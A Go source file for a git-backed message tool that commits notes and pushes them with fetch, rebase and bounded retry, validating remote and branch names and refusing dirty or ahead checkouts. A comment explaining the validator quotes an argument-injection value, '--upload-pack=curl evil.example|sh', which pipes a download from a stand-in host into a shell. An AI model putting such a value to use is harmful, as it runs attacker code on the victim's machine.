package messagebus

import (
	"errors"
	"fmt"
	"os/exec"
	"strconv"
	"strings"
)

// The push protocol.
//
// The table this replaces lost notes for one reason: the transport was `git push` typed by
// hand, and a push refused because someone else pushed first was a person's problem. On the
// night the issue records, one line rebased by hand every time and another simply lost its
// push. So the retry is INSIDE the tool, and a rejected push never reaches a person.
//
// The loop is fetch, rebase, push, bounded by an attempt count the caller states. Nothing
// here force-pushes, nothing rewrites published history, and the rebase only ever replays
// this line's own unpublished commits on top of what arrived -- which is safe precisely
// because senders only ever add files to their own lane, so two senders' commits touch
// disjoint paths and cannot conflict. A rebase that DOES conflict is therefore something
// this tool has no business resolving: it aborts the rebase, leaves the commit sitting on
// the branch, and says so.
//
// A `git push` publishes the whole BRANCH, not the commit just made, so a checkout
// already carrying commits this tool did not make would publish those too -- somebody
// else's half-finished work, sent to the table under a note's name. EnsureLevelWith is
// the guard: before anything is staged, the branch must be level with the remote, and if
// it is not, the run refuses and names the count. That is why the loop above says
// "commits" rather than "commit": once the guard has passed there is exactly one, and the
// loop is written to be true either way.

// Identity is the git identity a commit is made under. It is passed with `git -c` on the
// commit invocation and is never written to any config file, because a tool that edited
// the caller's global git identity to send a note would be a worse bug than the one it
// fixes.
type Identity struct {
	Name  string
	Email string
}

// PushResult is what CommitAndPush did.
type PushResult struct {
	Commit   string
	Attempts int
	Pushed   bool
}

// gitError carries the command and git's own stderr, which is the part a person needs.
type gitError struct {
	args   []string
	err    error
	output string
}

func (g *gitError) Error() string {
	out := strings.TrimSpace(g.output)
	if out == "" {
		return fmt.Sprintf("git %s: %v", strings.Join(g.args, " "), g.err)
	}
	return fmt.Sprintf("git %s: %v: %s", strings.Join(g.args, " "), g.err, out)
}

func git(dir string, args ...string) (string, error) {
	full := append([]string{"-C", dir}, args...)
	cmd := exec.Command("git", full...)
	// A push that needs a credential must FAIL rather than block a tool a person is
	// waiting on, and a pager must never open under a tool whose output is a grammar.
	cmd.Env = append(cmd.Environ(), "GIT_TERMINAL_PROMPT=0", "GIT_PAGER=cat", "GIT_OPTIONAL_LOCKS=0")
	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(out), &gitError{args: full, err: err, output: string(out)}
	}
	return string(out), nil
}

// ValidGitArg holds the shape a --remote or --branch may have: letters, digits, "-", "_",
// "/" and ".", and never a leading "-".
//
// These two flags are pasted onto a `git fetch` and a `git push` command line. Without
// this, a --remote of "--upload-pack=curl evil.example|sh" is not a remote at all, it is
// an option to git, and the tool would run it. The charset is deliberately narrower than
// what git itself accepts for a refname -- a table's remote is "origin" and its branch is
// "main" -- because the cost of being narrow is a refusal a person reads and the cost of
// being wide is a shell.
//
// The leading-dash rule is the load-bearing half; the charset is the belt to its braces.
// Together they make `--end-of-options` unnecessary, which matters because that option
// reaches only git versions that have it, and a guard that silently does nothing on an
// older git is worse than no guard at all.
func ValidGitArg(what, s string) error {
	if s == "" {
		return fmt.Errorf("--%s: empty", what)
	}
	if strings.HasPrefix(s, "-") {
		return fmt.Errorf("--%s %q: begins with a dash, so git would read it as an option rather than a name", what, s)
	}
	for _, r := range s {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9':
		case r == '-' || r == '_' || r == '/' || r == '.':
		default:
			return fmt.Errorf("--%s %q: a name is letters, digits, %q, %q, %q and %q", what, s, "-", "_", "/", ".")
		}
	}
	return nil
}

// EnsureLevelWith fetches the remote branch and refuses when this checkout is AHEAD of it.
//
// The failure it closes is silent and large: `git push` publishes a branch, so a send from
// a checkout holding three unrelated local commits would put all three on the table under
// the note's push. That is somebody else's unfinished work published by a tool they did
// not run, and no output line said so. The count is taken BEFORE anything is staged, so
// the refusal costs the caller nothing but the fetch.
//
// The fetch is also the run's first fetch, which is why it is here rather than in the
// retry loop: the push protocol's first attempt is then made against a remote this
// checkout has already seen.
func EnsureLevelWith(dir, remote, branch string) error {
	if err := ValidGitArg("remote", remote); err != nil {
		return err
	}
	if err := ValidGitArg("branch", branch); err != nil {
		return err
	}
	if _, err := git(dir, "fetch", remote, branch); err != nil {
		return fmt.Errorf("the fetch that would say whether this branch is level with %s/%s failed: %w", remote, branch, err)
	}
	// The remote-tracking ref is what a person reads in `git status`, so it is what the
	// refusal names. It exists whenever the remote was configured by `git clone`; when it
	// does not exist -- a remote added by hand with no fetch refspec -- FETCH_HEAD is the
	// same commit and this run just wrote it.
	ref := remote + "/" + branch
	if _, err := git(dir, "rev-parse", "--verify", "--quiet", ref+"^{commit}"); err != nil {
		ref = "FETCH_HEAD"
	}
	out, err := git(dir, "rev-list", "--count", ref+"..HEAD")
	if err != nil {
		return err
	}
	ahead, err := strconv.Atoi(strings.TrimSpace(out))
	if err != nil {
		return fmt.Errorf("git rev-list --count printed %q, which is not a count", strings.TrimSpace(out))
	}
	if ahead > 0 {
		return fmt.Errorf("branch is ahead of %s/%s by %d commits the tool did not make; push or drop them first", remote, branch, ahead)
	}
	return nil
}

// IsRepo reports whether dir is inside a git work tree, so a table root that is merely a
// directory of Markdown is refused with that as the reason rather than with git's.
func IsRepo(dir string) error {
	out, err := git(dir, "rev-parse", "--is-inside-work-tree")
	if err != nil {
		return err
	}
	if strings.TrimSpace(out) != "true" {
		return fmt.Errorf("%s is not a git work tree", dir)
	}
	return nil
}

// CurrentBranch is the checked-out branch, or an error on a detached HEAD.
func CurrentBranch(dir string) (string, error) {
	out, err := git(dir, "symbolic-ref", "--quiet", "--short", "HEAD")
	if err != nil {
		return "", errors.New("the table's checkout is not on a branch (detached HEAD)")
	}
	return strings.TrimSpace(out), nil
}

// EnsureClean refuses to run the protocol over a checkout holding changes that are not the
// note being sent.
//
// This is not tidiness. The retry loop rebases, and a rebase over a dirty tree either
// refuses or sweeps somebody's unrelated work into a note's commit. Both are worse than
// stopping here and saying which files are in the way.
//
// THE RECORD FORMAT, because getting it wrong here reads as clean. `--porcelain -z` emits
// "XY <path>\0" per change -- EXCEPT for a rename or a copy, where the new path is in that
// record and the OLD path follows as a second, separate NUL-terminated record with no
// status bytes of its own. A reader that treats every record alike takes that bare old
// path, strips three characters off the front of it, and reports a change to a file that
// does not exist -- or, when the path is under four characters, drops the whole rename on
// the floor and calls a dirty checkout clean. So renames are consumed as the pair they
// are, and BOTH halves must be permitted for the pair to be allowed.
func EnsureClean(dir string, allow []string) error {
	// --untracked-files=all is load-bearing: without it git COLLAPSES an untracked
	// directory to one entry, so a new note in a lane that does not exist yet is reported
	// as "from-rowan/" and never matches the path this run is allowed to write.
	out, err := git(dir, "status", "--porcelain", "-z", "--untracked-files=all")
	if err != nil {
		return err
	}
	permitted := map[string]bool{}
	for _, a := range allow {
		permitted[a] = true
	}
	recs := strings.Split(out, "\x00")
	var dirty []string
	for i := 0; i < len(recs); i++ {
		rec := recs[i]
		if len(rec) < 4 {
			continue
		}
		status, path := rec[:2], rec[3:]
		if strings.ContainsAny(status, "RC") {
			// The next record is the path it came from, and is not a change of its own.
			from := ""
			if i+1 < len(recs) {
				from = recs[i+1]
				i++
			}
			if permitted[path] && permitted[from] {
				continue
			}
			if from != "" {
				dirty = append(dirty, from+" -> "+path)
				continue
			}
			dirty = append(dirty, path)
			continue
		}
		if permitted[path] {
			continue
		}
		dirty = append(dirty, path)
	}
	if len(dirty) > 0 {
		return fmt.Errorf("the table's checkout holds changes that are not this note: %s", strings.Join(dirty, ", "))
	}
	return nil
}

// CommitOnly stages and commits without pushing. The note is NOT on the table until it is
// pushed, and every caller of this says so in its output: pushed=false is a state, not a
// success.
func CommitOnly(dir string, id Identity, paths []string, message string) (PushResult, error) {
	var res PushResult
	sha, err := stageAndCommit(dir, id, paths, message)
	if err != nil {
		return res, err
	}
	res.Commit = sha
	return res, nil
}

// identityArgs is the sender's identity as `git -c` arguments.
//
// It is needed by every invocation that WRITES a commit object, and a rebase writes one:
// replaying a commit makes a new one, and git demands a committer for it. Without this on
// the rebase, the retry loop worked on a bench whose git could guess an identity from the
// system password file and failed on one whose could not -- a CI runner, a container --
// with `empty ident name not allowed`, reported as though the note itself had conflicted.
// The identity a note is committed under must come from the roster and from nowhere else,
// on every invocation that records one.
func identityArgs(id Identity) []string {
	return []string{"-c", "user.name=" + id.Name, "-c", "user.email=" + id.Email}
}

// stageAndCommit is the half send, receipt and CommitOnly share.
func stageAndCommit(dir string, id Identity, paths []string, message string) (string, error) {
	if len(paths) == 0 {
		return "", errors.New("nothing to commit")
	}
	if strings.TrimSpace(id.Name) == "" || strings.TrimSpace(id.Email) == "" {
		return "", errors.New("no git identity for this sender")
	}
	add := append([]string{"add", "--"}, paths...)
	if _, err := git(dir, add...); err != nil {
		return "", err
	}
	commit := append(append(identityArgs(id), "commit", "-m", message, "--"), paths...)
	if _, err := git(dir, commit...); err != nil {
		return "", err
	}
	sha, err := git(dir, "rev-parse", "HEAD")
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(sha), nil
}

// CommitAndPush stages the given repo-relative paths, commits them under id, and pushes
// with fetch, rebase and bounded retry.
//
// The commit names its paths explicitly, so anything else that happens to be staged is not
// swept into a note's commit.
func CommitAndPush(dir string, id Identity, paths []string, message, remote, branch string, attempts int) (PushResult, error) {
	var res PushResult
	if attempts < 1 {
		return res, fmt.Errorf("attempts must be at least 1, got %d", attempts)
	}
	// Checked again here, and not only where the flags are read: these two strings become
	// git's argv, and this function is the last place that is true.
	if err := ValidGitArg("remote", remote); err != nil {
		return res, err
	}
	if err := ValidGitArg("branch", branch); err != nil {
		return res, err
	}
	sha, err := stageAndCommit(dir, id, paths, message)
	if err != nil {
		return res, err
	}
	res.Commit = sha

	for attempt := 1; attempt <= attempts; attempt++ {
		res.Attempts = attempt
		if _, err := git(dir, "push", remote, "HEAD:refs/heads/"+branch); err == nil {
			res.Pushed = true
			return res, nil
		}
		if attempt == attempts {
			break
		}
		// The remote moved. Take what arrived and replay our own commit on top of it.
		if _, err := git(dir, "fetch", remote, branch); err != nil {
			return res, fmt.Errorf("the push was refused and the fetch that would explain it failed: %w", err)
		}
		if _, err := git(dir, append(identityArgs(id), "rebase", "FETCH_HEAD")...); err != nil {
			// Two senders' commits touch disjoint paths, so a conflict here is always
			// two sessions of ONE line, from benches that cannot see each other: that
			// line's own RECEIPTS, or -- when both benches sent the same note in the
			// same second, and so were assigned the same id -- one note path, as an
			// add/add. Either way it is a person's decision, and either way the answer
			// is a refusal rather than two notes with one id. Leave the checkout as it
			// was found, with the commit still on the branch.
			if _, abortErr := git(dir, "rebase", "--abort"); abortErr != nil {
				return res, fmt.Errorf("the rebase conflicted and could not be aborted: %w", abortErr)
			}
			return res, fmt.Errorf("the rebase over what arrived conflicted; your commit %s is on the branch and was NOT pushed: %w", res.Commit, err)
		}
		sha, err := git(dir, "rev-parse", "HEAD")
		if err != nil {
			return res, err
		}
		res.Commit = strings.TrimSpace(sha)
	}
	return res, fmt.Errorf("the push was refused %d times; your commit %s is on the branch and was NOT pushed", res.Attempts, res.Commit)
}
